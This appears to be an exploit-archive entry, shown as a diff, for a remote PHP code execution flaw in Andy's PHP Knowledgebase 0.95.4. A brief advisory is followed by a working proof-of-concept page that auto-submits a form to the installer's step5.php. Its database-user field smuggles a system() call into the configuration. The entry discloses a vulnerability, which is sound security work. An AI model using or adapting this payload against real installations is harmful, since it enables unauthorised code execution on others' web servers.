@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/47918/info
+
+Andy's PHP Knowledgebase is prone to a vulnerability that lets remote attackers execute arbitrary code because the application fails to sanitize user-supplied input.
+
+Attackers can exploit this issue to execute arbitrary PHP code within the context of the affected webserver process.
+
+Andy's PHP Knowledgebase 0.95.4 is vulnerable; other versions may also be affected. 
+
+<html>
+    <body onload="document.forms[0].submit()"> 
+        <form method="POST" action="http://localhost/aphpkb/install/step5.php">  
+            <input type="hidden" name="install_dbuser" value="');system('calc');//" />   
+            <input type="submit" name="submit" />   
+        </form>   
+    </body>
+</html>
